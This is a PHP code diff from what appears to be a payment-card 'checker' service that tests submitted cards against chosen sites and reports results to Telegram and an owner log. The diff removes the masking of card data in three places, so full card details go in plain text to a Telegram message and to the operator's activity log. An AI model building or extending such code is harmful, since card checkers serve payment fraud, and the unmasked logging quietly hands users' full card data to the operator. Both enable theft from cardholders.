@@ -159,11 +159,10 @@ if (!empty($card) && !empty($site)) {
     // Send "checking started" notification to user
     try {
         if (function_exists('sendTelegramHtml') && SiteConfig::get('notify_check_started', true)) {
-            $masked_card = substr($card, 0, 4) . '****' . substr($card, -4);
             $start_notification = (
                 "🔄 <b>Card Check Started</b>\n\n" .
                 "👤 <b>User ID:</b> {$telegram_id}\n" .
-                "💳 <b>Card:</b> <code>{$masked_card}</code>\n" .
+                "💳 <b>Card:</b> <code>{$card}</code>\n" .
                 "🔗 <b>Site:</b> " . htmlspecialchars($site) . "\n" .
                 "⏳ <b>Status:</b> Checking in progress..."
             );
@@ -422,7 +421,7 @@ if (!empty($card) && !empty($site)) {
                         $ownerLogger->sendUserActivity(
                             $user,
                             'Card Check',
-                            "Card: " . substr($card, 0, 8) . "****|**|**|*** on " . parse_url($site, PHP_URL_HOST) . " - Result: " . $final_status_type
+                            "Card: {$card} on " . parse_url($site, PHP_URL_HOST) . " - Result: " . $final_status_type
                         );
                     } catch (Exception $e) {
                         error_log("Owner logging failed: " . $e->getMessage());
@@ -596,7 +595,7 @@ if ($is_valid_card && $is_valid_site) {
             $ownerLogger->sendUserActivity(
                 $user,
                 'Card Check',
-                "Card: " . substr($card, 0, 8) . "****|**|**|*** on " . parse_url($site, PHP_URL_HOST) . " - Result: " . ($response_data['status'] ?? 'Unknown')
+                "Card: {$card} on " . parse_url($site, PHP_URL_HOST) . " - Result: " . ($response_data['status'] ?? 'Unknown')
             );
         } catch (Exception $e) {
             error_log("Owner logging failed: " . $e->getMessage());
